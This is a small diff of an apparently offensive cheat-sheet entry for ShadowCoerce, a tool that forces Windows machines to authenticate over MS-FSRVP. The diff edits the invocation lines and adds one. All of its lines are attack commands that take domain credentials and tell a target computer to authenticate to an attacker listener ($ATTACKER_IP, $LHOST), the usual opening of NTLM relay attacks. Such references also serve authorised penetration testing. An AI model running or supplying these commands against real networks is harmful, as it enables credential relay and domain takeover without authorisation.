@@ -1,3 +1,4 @@
 # ShadowCoerce — Coercion via MS-FSRVP
-python3 shadowcoerce.py -u $USER -p $PASSWORD -d $DOMAIN $LISTENER_IP $TARGET_COMPUTER
-shadowcoerce.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$TARGET"
+ShadowCoerce -u $USER -p $PASSWORD -d $DOMAIN $LISTENER_IP $TARGET_COMPUTER
+ShadowCoerce -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$TARGET"
+ShadowCoerce -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$LHOST" "$TARGET"
